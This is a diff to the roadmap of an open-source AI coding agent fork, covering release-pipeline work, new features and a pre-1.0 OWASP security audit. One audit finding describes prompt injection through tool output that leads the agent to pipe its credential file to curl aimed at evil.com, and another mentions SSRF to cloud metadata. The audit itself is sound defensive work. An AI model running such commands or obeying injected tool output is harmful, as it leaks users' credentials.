@@ -2,7 +2,9 @@
 
 > Fork of [anomalyco/opencode v1.2.27](https://github.com/anomalyco/opencode/tree/v1.2.27)
 > Goal: Local-first AI coding agent with clean architecture and community provider ecosystem.
-> Last updated: 2026-04-15 | ~200 commits | Tests: 1607 pass, 0 fail | **v1.0.0-preview.1** (Phase 22 complete)
+> Last updated: 2026-04-18 | ~220 commits | Tests: 1616 pass, 0 fail | **v0.9.8** (Phase 28 complete)
+>
+> **Release track:** staying on `0.9.x` until we're truly 1.0-ready. No `1.0.0-preview.x` tags until the security findings in the "Pre-1.0 Hardening" section are closed out.
 
 ---
 
@@ -322,20 +324,190 @@ Shipped the v1.0 preview: version alignment across all three repos, release meta
 | **CHANGELOG.md (main repo)**               | Keep-a-Changelog format, full v1.0.0-preview.1 entry with known limitations + upgrade notes                                                     | `CHANGELOG.md`                                                                       | ✅     |
 | **README install matrix update**           | Added one-line installer, Homebrew tap, Flatpak, `$schema` autocomplete hint                                                                    | `README.md`                                                                          | ✅     |
 | **Docs index + troubleshooting**           | `docs/index.md` table of contents; `docs/troubleshooting.md` covers install, macOS gatekeeper, WebKitGTK compositing, providers, MCP, dev setup | `docs/index.md`, `docs/troubleshooting.md`                                           | ✅     |
-| **i18n repo: desktop locale parity**       | Added `th.ts` + `tr.ts` to `librecode-i18n/src/desktop/`                                                                                        | pending publish                                                                      |
-| **i18n repo: version bump + CHANGELOG**    | Bump to `1.0.0-preview.1`, add CHANGELOG, tag, publish via OIDC                                                                                 | pending publish                                                                      |
-| **3rd-party providers: bump + publish**    | All 4 packages → `1.0.0-preview.1`, republish via OIDC (proves 7 pending CI fixes work)                                                         | pending publish                                                                      |
-| **Tag `v1.0.0-preview.1`**                 | Tag fires release.yml (CLI) + desktop.yml (desktop bundles) + flatpak.yml; auto-populated Flatpak tarball sha256                                | pending tag                                                                          |
-| **Post-tag: Homebrew sha256 fill-in**      | After release tarballs exist, compute sha256 from SHA256SUMS, commit to tap repo                                                                | pending release                                                                      |
+| **i18n repo: desktop locale parity**       | Added `th.ts` + `tr.ts` to `librecode-i18n/src/desktop/`                                                                                        | `librecode-i18n/src/desktop/`                                                        | ✅     |
+| **i18n repo: version bump + CHANGELOG**    | Bumped and publishing via OIDC per release cut                                                                                                  | `librecode-i18n/`                                                                    | ✅     |
+| **3rd-party providers: bump + publish**    | All 4 packages publishing via OIDC on each tag                                                                                                  | `librecode-3rdparty-providers/`                                                      | ✅     |
+
+### Phase 22a: Release Pipeline Consolidation + OIDC ✅ (v0.9.8)
+
+After initial preview work, consolidated 6 racing workflows into a single master orchestrator and fixed npm OIDC trusted publishing end-to-end.
+
+| Item                                           | Description                                                                                                                                 | Files                                                               | Status |
+| ---------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------- | ------ |
+| **Master release orchestrator**                | `release.yml` calls CI, npm-publish, desktop, flatpak, copr as `workflow_call` subs — no parallel racing, proper `needs:` dependencies     | `.github/workflows/release.yml` (7 stages)                          | ✅     |
+| **Gate CI to PRs only**                        | `ci.yml`, `build.yml`, `nix.yml` no longer fire on push-to-main; release orchestrator runs CI via workflow_call                             | `.github/workflows/{ci,build,nix}.yml`                              | ✅     |
+| **npm OIDC: no more NPM_TOKEN**                | Removed `registry-url` from `setup-node` (which wrote an `.npmrc` with broken NODE_AUTH_TOKEN interpolation that overrode OIDC)              | all 3 repos' `npm-publish.yml`                                      | ✅     |
+| **npm OIDC: Node 24 pin for npm 11+**          | Node 22 ships npm 10 which predates OIDC. Pinned `node-version: "24.9.0"` — ships npm 11.x, no unpinned `@latest` supply-chain risk        | all 3 repos' `npm-publish.yml`                                      | ✅     |
+| **COPR: librecode-desktop AutoReqProv**        | Disable automatic dependency scan on 132 MB binary (was hanging COPR build forever)                                                         | `packages/rpm/librecode-desktop.spec`                               | ✅     |
+| **macOS signed DMG + notarization**            | Pre-unlock keychain + `set-keychain-settings -t 3600` to prevent codesign timeout on long builds                                           | `.github/workflows/desktop.yml`                                     | ✅     |
+| **Bun.build success gate**                     | `Bun.build()` silently returned raw runtime on failure → added `result.success` check so compile errors fail the build step                | `packages/librecode/script/build.ts`                                | ✅     |
+| **RPM strip skip for Bun binary**              | `%global __strip /bin/true` prevents rpmbuild strip from destroying the Bun-compiled binary                                                | `packages/rpm/librecode-desktop.spec`                               | ✅     |
+
+### Phase 23: Platform-Aware File Manager Icon ✅ (Issue #1)
+
+| Item                              | File                                                         | Status |
+| --------------------------------- | ------------------------------------------------------------ | ------ |
+| Tauri `getFileManagerInfo` cmd    | `packages/desktop/src-tauri/src/lib.rs`                      | ✅     |
+| Platform context adapter          | `packages/app/src/context/platform.tsx`                      | ✅     |
+| Generic folder icon in sprite     | `packages/ui/src/components/app-icons/sprite.svg` + types.ts | ✅     |
+| Session header dynamic label      | `packages/app/src/components/session/session-header.tsx`     | ✅     |
+
+### Phase 24: Progress Indicator + Liveness Detection ✅ (Issue #2)
+
+| Item                          | File                                                       | Status |
+| ----------------------------- | ---------------------------------------------------------- | ------ |
+| StreamingIndicator component  | `packages/app/src/components/session/streaming-indicator.tsx` | ✅  |
+| Stall-detector primitive      | `packages/app/src/utils/stall-detector.ts`                 | ✅     |
+| Token I/O accumulators        | `packages/librecode/src/session/activity-tracker.ts`       | ✅     |
+| Event SDK type extension      | `packages/sdk/js/src/v2/gen/types.gen.ts`                  | ✅     |
+
+### Phase 25: Local Compute Guided Setup ✅ (Issue #6)
+
+| Item                          | File                                                | Status |
+| ----------------------------- | --------------------------------------------------- | ------ |
+| Setup wizard component        | `packages/app/src/components/local-compute-setup.tsx` | ✅   |
+| `/system/info` endpoint       | `packages/librecode/src/server/routes/system.ts`    | ✅     |
+| Wizard integration            | `packages/app/src/components/local-server-wizard.tsx` | ✅   |
+
+### Phase 26: Voice "Talk to Me" Mode ✅ (Issue #5)
+
+| Item                     | File                                               | Status |
+| ------------------------ | -------------------------------------------------- | ------ |
+| `createVoiceInput` hook  | `packages/app/src/utils/voice-input.ts`            | ✅     |
+| Prompt input mic button  | `packages/app/src/components/prompt-input.tsx`     | ✅     |
+| Voice settings           | `packages/app/src/components/settings-general.tsx` | ✅     |
+| macOS mic entitlement    | `packages/desktop/src-tauri/entitlements.plist`    | ✅     |
+
+### Phase 27: Productivity vs Development Mode ✅ (Issue #4)
+
+| Item                   | File                                                | Status |
+| ---------------------- | --------------------------------------------------- | ------ |
+| Mode context           | `packages/app/src/context/mode.tsx`                 | ✅     |
+| `app_mode` config      | `packages/librecode/src/config/schema.ts`           | ✅     |
+| Session-header toggle  | `packages/app/src/components/session/session-header.tsx` | ✅ |
+| Tool visibility field  | `packages/librecode/src/tool/capabilities.ts`       | ✅     |
+
+### Phase 28: MCP App Start Menu + Built-in Apps ✅ (Issue #3)
+
+| Item                         | File                                                    | Status |
+| ---------------------------- | ------------------------------------------------------- | ------ |
+| Built-in app registry        | `packages/librecode/src/mcp/builtin-apps/index.ts`      | ✅     |
+| FS activity graph app        | `packages/librecode/src/mcp/builtin-apps/fs-activity-graph.html` | ✅ |
+| Session stats dashboard app  | `packages/librecode/src/mcp/builtin-apps/session-stats.html` | ✅ |
+| Start menu popover           | `packages/app/src/components/start-menu.tsx`            | ✅     |
+| SSE → iframe event forwarding| `packages/app/src/components/mcp-app-panel.tsx`         | ✅     |
+| Pinned-apps context          | `packages/app/src/context/pinned-apps.tsx`              | ✅     |
 
 ---
 
-### Nice to Have
+## 🔒 Pre-1.0 Hardening (gating the 1.0.0-preview.x cut)
 
-| Item                   | Description                                                                                                                 | Effort | Priority |
-| ---------------------- | --------------------------------------------------------------------------------------------------------------------------- | ------ | -------- |
-| **Flatpak full build** | SHA256 hashes filled (Bun x64/aarch64 + v0.1.0 tarball); cargo-sources.json generated (1,379 Cargo deps); manifest complete | Medium | ✅ Done  |
-| **Turbo evaluation**   | Keep Turbo. Cold run: 40.5s · Warm (cache hit): 272ms = **149× speedup**. Already integrated at zero cost.                  | Small  | ✅ Done  |
+Full OWASP Top 10 audit performed 2026-04-18. Overall posture: **NEEDS WORK**. Address these before cutting any `1.0.0-preview.x` tag. Tracked here, not in Phase 22 (which stays closed).
+
+### Critical / High-severity (must-fix before 1.0.0-preview.1)
+
+| # | OWASP | Issue | Location | Effort | Status |
+|---|-------|-------|----------|--------|--------|
+| 1 | A05 | **`--mdns` silently binds `0.0.0.0` without password** → LAN-reachable unauth RCE. Fail-closed: require `LIBRECODE_SERVER_PASSWORD` for non-loopback hostnames, not just a warning | `packages/librecode/src/cli/network.ts:39-48`; `packages/librecode/src/cli/cmd/{web,serve}.ts` | Small | TODO |
+| 2 | A04/A02 | **`auth.json` exfiltration via bash tool.** Malicious tool output can instruct agent `cat ~/.local/share/librecode/auth.json \| curl -X POST evil.com`. Add hard-coded read-block on credential paths in `bash`, `read`, `webfetch`; store tokens in OS keychain (`@napi-rs/keyring` or Tauri stronghold) | `packages/librecode/src/auth/service.ts:34`; `packages/librecode/src/tool/bash.ts`; `packages/librecode/src/file/protected.ts` | Medium | TODO |
+| 3 | A08 | **SHA256SUMS doesn't cover desktop installers** (.deb/.rpm/.exe/.dmg/.flatpak). One-line workflow fix | `.github/workflows/release.yml:150` | Tiny | TODO |
+| 4 | A05 | **Production Tauri CSP is `null`.** Prod config inherits base's `"csp": null`. Combined with `withGlobalTauri: true` + broad `http:default`/`opener` grants, any UI XSS = full host takeover. Set real CSP, narrow grants, set `withGlobalTauri: false` | `packages/desktop/src-tauri/tauri.prod.conf.json` (no `app.security.csp`); `capabilities/default.json` | Medium | TODO |
+| 5 | A06 | **`bun audit`: 16 high-severity advisories.** `hono 4.10.7` → `^4.11.4` (arbitrary file access GHSA-q5qw-h33p-qvwr), `@modelcontextprotocol/sdk ≤1.25.3` (cross-client data leak), `minimatch` ReDoS, `seroval` RCE, `vite 7.1.4` dev fs-deny bypass, `dompurify 3.3.1` XSS. Bump the catalog | `package.json` catalog block | Small | TODO |
+| 6 | A10 | **`webfetch` has no SSRF protection.** Gated only by `ctx.ask`, but user may click-through. LLM can hit `169.254.169.254` (cloud metadata), internal services. Reuse `BLOCKED_HOST_PATTERNS` from `provider/scan`; resolve DNS once + check IP (prevent rebinding) | `packages/librecode/src/tool/webfetch.ts:22-30` | Small | TODO |
+| 7 | A06 | **`cargo audit` not in CI.** Rust/Tauri dep graph unchecked. Add to `scripts/dev-setup.sh --deps` + wire into `ci.yml` | `ci.yml`, `scripts/dev-setup.sh` | Tiny | TODO |
+
+### Medium-severity (should-fix before 1.0.0-preview.1)
+
+| # | OWASP | Issue | Location | Effort | Status |
+|---|-------|-------|----------|--------|--------|
+| 8 | A01 | Rename unsafe lexical `Filesystem.contains()` → `containsLexical`; default callers to symlink-safe `containsSafe`. Add lint rule | `packages/librecode/src/util/filesystem.ts:150-152` | Small | TODO |
+| 9 | A02 | Log redaction layer: strip keys matching `/token\|secret\|key\|authorization\|access\|refresh/i` before write | `packages/librecode/src/util/log.ts:109-121` | Small | TODO |
+| 10 | A05 | CORS: require exact port match with known local ports, not `http://localhost:*` wildcard | `packages/librecode/src/server/server.ts:72-81` | Tiny | TODO |
+| 11 | A05 | Error handler: `err.message` only in prod; stack trace behind `--dev` | `packages/librecode/src/server/server.ts:68-69` | Tiny | TODO |
+| 12 | A07 | Basic-auth rate-limit (token bucket by IP) + 401 logging for brute-force visibility | `packages/librecode/src/server/server.ts:94-102` | Small | TODO |
+| 13 | A04 | `/log` endpoint is unauthenticated; LAN peer in mdns mode can pollute audit stream. Gate behind basic-auth | `packages/librecode/src/server/server.ts:104, 191, 359-409` | Tiny | TODO |
+| 14 | A08 | Generate CycloneDX SBOMs at release time (`@cyclonedx/cyclonedx-npm` for CLI, `cargo cyclonedx` for Tauri); upload with release | `.github/workflows/release.yml` | Small | TODO |
+
+Strengths already in place (keep these): `Instance.containsPath` symlink-safe, `/provider/scan` SSRF patched, MCP iframe null-origin sandbox + CSP, OAuth state CSRF via `crypto.getRandomValues(32)`, npm OIDC + sigstore provenance, permission audit log, Drizzle-only SQL.
+
+---
+
+## 📋 Best-Practices Audit (snapshot 2026-04-18)
+
+| Check | Target | Actual | Status |
+|---|---|---|---|
+| Tests pass | all green | 1,616 pass, 9 skip, 0 fail | ✅ |
+| Typecheck | 0 errors | 0 errors | ✅ |
+| Lint warnings | 0 net-new | 38 (mostly `any` in TUI legacy; no new code) | ⚠️ |
+| Files over 1000 lines | 0 | **6** (must split) | ❌ |
+| `export namespace` usages | 0 in new code | 6 remain (ACP, Provider, MessageV2, Session, ServerConnection, Identifier) | ⚠️ |
+| Complexity > 12 | 0 | 0 | ✅ |
+
+### Files over 1000 lines (violates CLAUDE.md)
+
+| File | Lines | Split strategy |
+|------|-------|----------------|
+| `packages/librecode/src/provider/sdk/copilot/responses/openai-responses-language-model.ts` | 1,778 | Split by capability: tool-call/streaming/non-streaming |
+| `packages/ui/src/components/file-icons/types.ts` | 1,095 | Codegen — exclude from size rule or generate from a TOML |
+| `packages/librecode/src/mcp/index.ts` | 1,082 | Extract OAuth flow + built-in-apps merge into submodules |
+| `packages/app/src/components/prompt-input.tsx` | 1,037 | Extract voice input, file attachments, suggestion list |
+| `packages/app/src/pages/session.tsx` | 1,010 | Extract side-panel orchestration, header assembly |
+| `packages/app/src/pages/layout.tsx` | 1,007 | Extract nav, command palette, settings modal wiring |
+
+### Remaining namespace migrations (Playbook 1 in CLAUDE.md)
+
+Apply barrel-export pattern, one PR each (per Playbook 1 rules):
+
+1. `packages/librecode/src/acp/agent.ts:715` — `export namespace ACP`
+2. `packages/librecode/src/provider/provider.ts:544` — `export namespace Provider` (partial migration already)
+3. `packages/librecode/src/session/message-v2.ts:819` — `export namespace MessageV2`
+4. `packages/librecode/src/session/index.ts:910` — `export namespace Session`
+5. `packages/app/src/context/server.tsx:36` — `export namespace ServerConnection`
+6. `packages/app/src/utils/id.ts:17` — `export namespace Identifier`
+
+---
+
+## 📦 Deferred Items (from earlier phases, still valid)
+
+| Item | Source | Priority | Status |
+|------|--------|----------|--------|
+| Flathub submission (public listing; manifest already builds in CI) | Phase 22 | Low | Deferred |
+| AppImage end-to-end verification (`APPIMAGE_EXTRACT_AND_RUN=1` wired but not validated on fresh system) | Phase 22 | Low | Deferred |
+| Desktop locale parity: human-review `th.ts`/`tr.ts` translations | Phase 22 | Low | Deferred |
+| Design-debt TODOs in `session/prompt-builder.ts:374, 503` | Phase 22 | Low | Deferred |
+| Design-debt TODOs in `plugin/copilot.ts:192-193` | Phase 22 | Low | Deferred |
+| Coverage gap in `processor.ts`, `prompt.ts`, `prompt-builder.ts`, `compaction.ts` (<20% each; needs BDD/E2E with running agent, not unit tests) | Phase 20 | Medium | Deferred |
+| Update Homebrew formula sha256s to match `v0.9.8` `SHA256SUMS` (currently points at v1.0.0-preview.1) | Phase 22 | Small | TODO |
+
+---
+
+## 🗺️ Net-New Roadmap (post-hardening, pre-1.0)
+
+No GitHub issues currently open. These are candidate workstreams we've discussed; pick based on user priority.
+
+### Phase 29: MCP Co-editing App (deferred from Phase 28 per ADR-005)
+
+CRDT/OT implementation for collaborative real-time editing of shared documents in MCP apps. Design-only as ADR-005 today. Large effort.
+
+### Phase 30: BDD/E2E Coverage Push
+
+Close the coverage gap on `processor.ts`, `prompt.ts`, `prompt-builder.ts`, `compaction.ts` — the files that drive the actual agent loop. Requires a running agent + mock LLM; covered partially by `tests/features/*.feature` + Python pytest-bdd scaffolding already in place. Medium effort.
+
+### Phase 31: Windows Code-Signing + Store Submission
+
+Sign the `.exe` installer with an EV certificate, submit to Microsoft Store (or partner channels) to avoid SmartScreen warnings. Medium effort + cert-procurement cost.
+
+### Phase 32: Linux AppImage Auto-Update
+
+The Tauri updater currently disabled on Linux. Once AppImage is validated (deferred item above), wire up zsync-based delta updates via the AppImage updater framework. Small effort.
+
+### Phase 33: Plugin Marketplace
+
+Extend the 3rd-party providers pattern to arbitrary plugins/tools/MCP servers — searchable registry, publish CLI, one-click install from desktop UI. Large effort.
+
+### Phase 34: Enterprise Features (post-1.0)
+
+Deferred per local-first charter but listed for completeness: SSO/SAML, audit-log forwarding to SIEM, multi-tenant config, secrets management integration. Out-of-scope for 0.9.x / 1.0 stable.
 
 ---
 
@@ -343,15 +515,19 @@ Shipped the v1.0 preview: version alignment across all three repos, release meta
 
 | Metric                       | Value                                                                                                      |
 | ---------------------------- | ---------------------------------------------------------------------------------------------------------- |
-| Total commits                | ~200                                                                                                       |
-| Tests passing                | 1,607                                                                                                      |
+| Total commits                | ~220                                                                                                       |
+| Tests passing                | 1,616                                                                                                      |
 | Tests failing                | 0                                                                                                          |
-| Test files                   | 123                                                                                                        |
-| Current version              | **v1.0.0-preview.1**                                                                                       |
+| Tests skipped                | 9                                                                                                          |
+| Test files                   | 125                                                                                                        |
+| Current version              | **v0.9.8** (staying on 0.9.x until pre-1.0 hardening complete)                                             |
 | Complexity violations        | 0                                                                                                          |
-| Source files over 1000 lines | 0                                                                                                          |
-| Lint warnings total          | 0 (down from 1,933)                                                                                        |
-| ADRs                         | 4 (Effect-ts, Storage, Agent Loop, Auth Prompts)                                                           |
-| npm packages                 | 7 published (sdk, plugin, provider-anthropic, provider-openai, provider-openrouter, provider-bundle, i18n) |
-| Sister repos                 | librecode-3rdparty-providers, librecode-i18n                                                               |
+| Source files over 1000 lines | 6 (down from target of 0 — tracked for split)                                                              |
+| Lint warnings total          | 38 (legacy TUI `any`; down from 1,933)                                                                     |
+| Remaining `export namespace` | 6 (down from 4 original; 2 new additions need migration — Playbook 1)                                      |
+| OWASP audit posture          | NEEDS WORK — 7 high, 7 medium findings tracked above                                                        |
+| ADRs                         | 4 (Effect-ts, Storage, Agent Loop, Auth Prompts) + ADR-005 planned (co-editing)                            |
+| npm packages                 | 7 published via OIDC (sdk, plugin, provider-{anthropic,openai,openrouter}, provider-bundle, i18n)          |
+| Sister repos                 | librecode-3rdparty-providers, librecode-i18n (both on v0.9.8, OIDC-synced)                                 |
 | Core providers               | LiteLLM, Ollama, Amazon Bedrock, Azure                                                                     |
+| Release artifacts per tag    | 16 (7 CLI archives, 5 desktop installers, Flatpak, SHA256SUMS, config schema, source zip/tarball)          |
